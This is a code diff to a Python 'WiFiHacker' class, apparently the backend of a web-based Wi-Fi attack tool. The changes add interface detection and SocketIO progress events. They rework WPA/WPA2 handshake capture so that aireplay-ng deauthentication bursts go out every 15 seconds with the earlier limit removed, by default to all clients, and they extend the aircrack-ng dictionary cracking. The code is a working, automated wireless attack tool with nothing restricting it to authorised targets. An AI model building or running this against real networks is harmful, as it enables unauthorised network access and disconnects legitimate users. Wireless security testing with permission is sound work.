@@ -113,10 +113,12 @@ class WiFiHacker:
         self.current_attack = None
         self.attack_process = None
         self.attack_results: List[AttackResult] = []
-        self.monitor_interface = None
+        self.interface = None          # Base wireless interface (e.g. wlan0)
+        self.monitor_interface = None  # Monitor mode interface (e.g. wlan0mon)
         self._attack_thread = None
         self._stop_flag = False
-        
+        self._socketio = None          # SocketIO instance for real-time events
+
         # Check available tools
         self.tools_available = self._check_tools()
     
@@ -159,6 +161,72 @@ class WiFiHacker:
         
         return tools
     
+    # ------------------------------------------------------------------
+    # API compatibility helpers (called from app.py routes)
+    # ------------------------------------------------------------------
+
+    def is_available(self) -> bool:
+        """Return True if at least one tool is available."""
+        return any(self.tools_available.values())
+
+    def check_requirements(self) -> Dict:
+        """Alias for get_requirements() used by app.py status route."""
+        return self.get_requirements()
+
+    @property
+    def monitor_mode_enabled(self) -> bool:
+        """True when a monitor interface is active."""
+        return self.monitor_interface is not None
+
+    def get_wireless_interfaces(self) -> List[str]:
+        """Return wireless interface names using iw dev or iwconfig."""
+        interfaces = []
+        try:
+            result = subprocess.run(
+                ['iw', 'dev'], capture_output=True, text=True, timeout=10
+            )
+            for line in result.stdout.split('\n'):
+                if 'Interface' in line:
+                    iface = line.split()[-1].strip()
+                    if iface:
+                        interfaces.append(iface)
+        except FileNotFoundError:
+            pass
+
+        if not interfaces:
+            try:
+                result = subprocess.run(
+                    ['iwconfig'], capture_output=True, text=True,
+                    stderr=subprocess.DEVNULL, timeout=10
+                )
+                for line in result.stdout.split('\n'):
+                    if 'IEEE 802.11' in line:
+                        iface = line.split()[0].strip()
+                        if iface:
+                            interfaces.append(iface)
+            except Exception:
+                pass
+
+        return interfaces
+
+    def set_interface(self, interface: str):
+        """Set the base wireless interface."""
+        self.interface = interface
+
+    def set_socketio(self, socketio_instance):
+        """Attach a Flask-SocketIO instance for real-time event emission."""
+        self._socketio = socketio_instance
+
+    def _emit(self, event: str, data: dict):
+        """Emit a SocketIO event if an instance is configured."""
+        if self._socketio:
+            try:
+                self._socketio.emit(event, data)
+            except Exception:
+                pass
+
+    # ------------------------------------------------------------------
+
     def get_requirements(self) -> Dict:
         """Get tool requirements and availability status"""
         attacks = {
@@ -225,20 +293,21 @@ class WiFiHacker:
         """Enable monitor mode on wireless interface"""
         if not self.tools_available.get('airmon-ng'):
             return {'success': False, 'error': 'airmon-ng not available'}
-        
+
         try:
-            # Kill interfering processes
+            # Kill interfering processes (wpa_supplicant, dhclient, etc.)
             subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True, timeout=30)
-            
-            # If no interface specified, try to find one
+
+            # Resolve interface: use argument, stored interface, or auto-detect
             if not interface:
-                result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)
-                interfaces = re.findall(r'^(\w+)\s+IEEE', result.stdout, re.MULTILINE)
-                if interfaces:
-                    interface = interfaces[0]
+                interface = self.interface
+            if not interface:
+                detected = self.get_wireless_interfaces()
+                if detected:
+                    interface = detected[0]
                 else:
                     return {'success': False, 'error': 'No wireless interface found'}
-            
+
             # Start monitor mode
             result = subprocess.run(
                 ['airmon-ng', 'start', interface],
@@ -246,13 +315,46 @@ class WiFiHacker:
                 text=True,
                 timeout=30
             )
-            
-            # Find the monitor interface name
-            self.monitor_interface = interface + 'mon'
-            if 'mon' not in result.stdout:
-                # Try alternative naming
-                self.monitor_interface = interface
-            
+
+            output = result.stdout + result.stderr
+
+            # Parse the actual monitor interface name from airmon-ng output.
+            # Common output patterns:
+            #   "monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon"
+            #   "(monitor mode enabled on wlan0mon)"
+            #   "monitor mode enabled"
+            mon_iface = None
+            patterns = [
+                r'monitor mode.*?enabled.*?on\s+\[?[\w]*\]?(\w+)',
+                r'monitor mode.*?enabled.*?\[[\w]+\](\w+)',
+                r'\(monitor mode enabled on\s+(\w+)\)',
+                r'enabled\s+(\w+mon\w*)',
+            ]
+            for pattern in patterns:
+                match = re.search(pattern, output, re.IGNORECASE)
+                if match:
+                    candidate = match.group(1).strip()
+                    if candidate and candidate != interface:
+                        mon_iface = candidate
+                        break
+
+            # Fallback: check if <interface>mon exists
+            if not mon_iface:
+                candidate = interface + 'mon'
+                check = subprocess.run(
+                    ['ip', 'link', 'show', candidate],
+                    capture_output=True, timeout=5
+                )
+                if check.returncode == 0:
+                    mon_iface = candidate
+                else:
+                    # Some drivers keep the same name in monitor mode
+                    mon_iface = interface
+
+            self.monitor_interface = mon_iface
+            if self.interface is None:
+                self.interface = interface
+
             return {
                 'success': True,
                 'interface': self.monitor_interface,
@@ -509,29 +611,39 @@ class WiFiHacker:
             self.attack_process = None
     
     def capture_handshake(self, bssid: str, channel: int, essid: str = "",
-                          timeout: int = 120, deauth: bool = True) -> Dict:
+                          client_mac: str = None, timeout: int = 120,
+                          deauth: bool = True) -> Dict:
         """
-        Capture WPA/WPA2 handshake
-        Optionally sends deauth packets to speed up capture
+        Capture WPA/WPA2 handshake using airodump-ng.
+        Sends periodic deauth frames (every 15 s) to force clients to
+        re-authenticate, which generates the 4-way handshake.
+        Emits SocketIO events so the frontend can follow progress live.
         """
         if not self.tools_available.get('airodump-ng'):
             return {'success': False, 'error': 'airodump-ng not available'}
-        
+
         if not self.monitor_interface:
             result = self.enable_monitor_mode()
-            if not result['success']:
+            if not result.get('success'):
                 return result
-        
+
         self.current_attack = AttackType.HANDSHAKE_CAPTURE
         self._stop_flag = False
         start_time = time.time()
-        
-        # Output file
+
+        # Output file prefix
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         capture_prefix = self.handshakes_dir / f"handshake_{bssid.replace(':', '')}_{timestamp}"
-        
+
+        self._emit('wifi_capture_status', {
+            'status': 'started',
+            'bssid': bssid,
+            'essid': essid,
+            'channel': channel
+        })
+
         try:
-            # Start airodump-ng to capture handshake
+            # Start airodump-ng locked to target channel and BSSID
             airodump_cmd = [
                 'airodump-ng',
                 '-c', str(channel),
@@ -540,49 +652,79 @@ class WiFiHacker:
                 '--output-format', 'cap',
                 self.monitor_interface
             ]
-            
+
             airodump_process = subprocess.Popen(
                 airodump_cmd,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL
             )
-            
+
             self.attack_process = airodump_process
             handshake_captured = False
-            
-            # Send deauth packets periodically
             deauth_count = 0
+            last_deauth_time = 0.0
+            deauth_interval = 15  # seconds between deauth bursts
+
             while time.time() - start_time < timeout and not self._stop_flag:
-                # Check if handshake file exists and has data
                 cap_file = Path(str(capture_prefix) + "-01.cap")
-                if cap_file.exists():
-                    # Check for handshake using aircrack-ng
+                elapsed = time.time() - start_time
+
+                # Poll the capture file every 3 s
+                time.sleep(3)
+
+                if cap_file.exists() and cap_file.stat().st_size > 0:
+                    # Verify handshake with aircrack-ng
                     check_result = subprocess.run(
                         ['aircrack-ng', str(cap_file)],
                         capture_output=True,
                         text=True,
                         timeout=10
                     )
-                    if '1 handshake' in check_result.stdout:
+                    if '1 handshake' in check_result.stdout.lower():
                         handshake_captured = True
+                        self._emit('wifi_capture_status', {
+                            'status': 'captured',
+                            'bssid': bssid,
+                            'file': str(cap_file),
+                            'elapsed': round(elapsed, 1)
+                        })
                         break
-                
-                # Send deauth
-                if deauth and self.tools_available.get('aireplay-ng') and deauth_count < 5:
+
+                # Emit periodic progress
+                self._emit('wifi_capture_status', {
+                    'status': 'capturing',
+                    'bssid': bssid,
+                    'elapsed': round(elapsed, 1),
+                    'deauth_count': deauth_count
+                })
+
+                # Send deauth burst every deauth_interval seconds (no upper limit)
+                if (deauth and self.tools_available.get('aireplay-ng') and
+                        time.time() - last_deauth_time >= deauth_interval):
+                    target = client_mac or 'FF:FF:FF:FF:FF:FF'
                     subprocess.run(
-                        ['aireplay-ng', '-0', '5', '-a', bssid, self.monitor_interface],
+                        ['aireplay-ng', '-0', '3', '-a', bssid,
+                         '-c', target, self.monitor_interface],
                         capture_output=True,
                         timeout=10
                     )
                     deauth_count += 1
-                
-                time.sleep(5)
-            
+                    last_deauth_time = time.time()
+                    self._emit('wifi_capture_status', {
+                        'status': 'deauth_sent',
+                        'bssid': bssid,
+                        'deauth_count': deauth_count
+                    })
+
             airodump_process.terminate()
+            try:
+                airodump_process.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                airodump_process.kill()
+
             duration = time.time() - start_time
-            
             cap_file = Path(str(capture_prefix) + "-01.cap")
-            
+
             result = AttackResult(
                 attack_type=AttackType.HANDSHAKE_CAPTURE,
                 target_bssid=bssid,
@@ -595,31 +737,39 @@ class WiFiHacker:
                     'deauth_sent': deauth_count
                 }
             )
-            
+
             if not handshake_captured:
                 result.error = "No handshake captured within timeout"
-            
+                self._emit('wifi_capture_status', {
+                    'status': 'timeout',
+                    'bssid': bssid,
+                    'elapsed': round(duration, 1)
+                })
+
             self.attack_results.append(result)
-            
             return result.to_dict()
-            
+
         except Exception as e:
+            self._emit('wifi_capture_status', {'status': 'error', 'error': str(e)})
             return {'success': False, 'error': str(e)}
         finally:
             self.current_attack = None
             self.attack_process = None
     
-    def crack_handshake(self, capture_file: str, wordlist: str,
-                        bssid: str = None) -> Dict:
+    def crack_handshake(self, capture_file: str, wordlist: str = None,
+                        bssid: str = None, use_gpu: bool = False) -> Dict:
         """
         Crack captured handshake using dictionary attack
         """
         if not self.tools_available.get('aircrack-ng'):
             return {'success': False, 'error': 'aircrack-ng not available'}
-        
+
         if not Path(capture_file).exists():
             return {'success': False, 'error': 'Capture file not found'}
-        
+
+        if not wordlist:
+            return {'success': False, 'error': 'Wordlist not specified'}
+
         if not Path(wordlist).exists():
             # Check in wordlists directory
             wordlist_path = self.wordlists_dir / wordlist
